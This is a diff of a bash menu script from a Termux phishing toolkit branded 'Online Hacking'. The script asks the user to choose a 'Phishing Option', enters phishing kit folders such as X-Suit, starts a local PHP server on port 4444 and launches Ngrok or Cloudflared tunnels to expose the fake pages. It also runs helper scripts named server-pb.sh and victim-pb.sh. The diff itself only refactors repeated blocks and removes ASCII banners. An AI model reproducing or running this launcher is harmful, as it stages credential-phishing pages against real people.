@@ -35,17 +35,13 @@ bash Logo.sh
 bash Logo2.sh
 echo ""
 echo ""
-                 echo -e $''   
-                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
-                 echo ""
-		 if [ $option = 01 ] || [ $option = 1 ]
-                 then 
-                           cd /data/data/com.termux/files/usr/bin/SUMAN
-                           cd X-Suit/
-			   echo ""
-                           echo""
-                           echo ""
-                           echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
+
+
+## Install Cloudflared
+server() {
+echo""
+         echo ""
+         echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
@@ -64,6 +60,19 @@ echo ""
 			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok... : \e[0m Turn On Mobile Hostpot  "
 			   echo ""
 			   sleep 5
+
+}
+
+
+                 echo -e $''   
+                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
+                 echo ""
+		 if [ $option = 01 ] || [ $option = 1 ]
+                 then 
+                           cd /data/data/com.termux/files/usr/bin/SUMAN
+                           cd X-Suit/
+			   echo ""
+                           bash /data/data/com.termux/files/usr/bin/OnlineHacking/server-pb.sh
 			   
 			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
 			   echo -ne "  "
@@ -90,30 +99,8 @@ echo ""
 			      
                            echo ""
 			   clear
-echo -e "\e[92m
-SUMAN ©\e[34m
-         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
-        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
-        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
-        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
-        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
-         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
-                                                            
-    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
-    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
-    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
-    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
-    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
-    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
-ONLINE HACKING			  
-							  							  
-          \e[m"
-echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.in  \e[93m/  \e[92mwww.onlinehacking.xyz  \e[0m\n"
-  
-echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"
-
-echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing \e[0m\n"
-		           echo ""
+			   bash /data/data/com.termux/files/usr/bin/OnlineHacking/victim-pb.sh
+                           echo ""
                            echo -e "\e[96m========================\e[92m    SUMAN © 2022    \e[96m=========================\e[92m"
                            echo ""
 			   echo ""
@@ -153,27 +140,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing \e[0m\n"
 	                   cd /data/data/com.termux/files/usr/bin/SUMAN/
                            cd Avalanche-X-Suit-LuckySpin/         
                            echo ""
-                           echo""
-                           echo ""
-                           echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
-			   sleep 2
-			   echo ""
-			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
-			   sleep 2
-			   echo ""
-			   echo -e $" \e[91m[\e[1;92m★\e[1;91m]\e[1;93m Turn On Mobile Hostpot ... \e[0m   "
-			   sleep 4
-			   echo ""
-			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;96m PHP Server Now Startng ... \e[0m  "
-                           echo ""
-			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 3
-			   echo -e $" \e[91m[\e[92m-\e[91m]\e[1;95m Start LocalHost... :  \e[0m http://127.0.0.1:4444 "
-			   echo ""
-			   sleep 2
-			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok... : \e[0m Turn On Mobile Hostpot  "
-			   echo ""
-			   sleep 5
+                           bash /data/data/com.termux/files/usr/bin/OnlineHacking/server-pb.sh
 			   
 			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
 			   echo -ne "  "
@@ -200,29 +167,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing \e[0m\n"
 			      
                            echo ""
 			   clear
-echo -e "\e[92m
-SUMAN ©\e[34m
-         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
-        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
-        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
-        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
-        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
-         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
-                                                            
-    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
-    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
-    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
-    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
-    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
-    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
-ONLINE HACKING			  
-							  							  
-          \e[m"
-echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.in  \e[93m/  \e[92mwww.onlinehacking.xyz  \e[0m\n"
-  
-echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"
-
-echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing \e[0m\n"
+                           bash /data/data/com.termux/files/usr/bin/OnlineHacking/victim-pb.sh
 		           echo ""
                            echo -e "\e[96m========================\e[92m    SUMAN © 2022    \e[96m=========================\e[92m"
                            echo ""
@@ -260,25 +205,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing \e[0m\n"
                            echo ""
                            echo""
                            echo ""
-                           echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
-			   sleep 2
-			   echo ""
-			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
-			   sleep 2
-			   echo ""
-			   echo -e $" \e[91m[\e[1;92m★\e[1;91m]\e[1;93m Turn On Mobile Hostpot ... \e[0m   "
-			   sleep 4
-			   echo ""
-			   echo -e $" \e[91m[\e[92m★\e[91m]\e[1;96m PHP Server Now Startng ... \e[0m  "
-                           echo ""
-			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 3
-			   echo -e $" \e[91m[\e[92m-\e[91m]\e[1;95m Start LocalHost... :  \e[0m http://127.0.0.1:4444 "
-			   echo ""
-			   sleep 2
-			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok... : \e[0m Turn On Mobile Hostpot  "
-			   echo ""
-			   sleep 5
+server
 			   
 			   echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
 			   echo -ne "  "
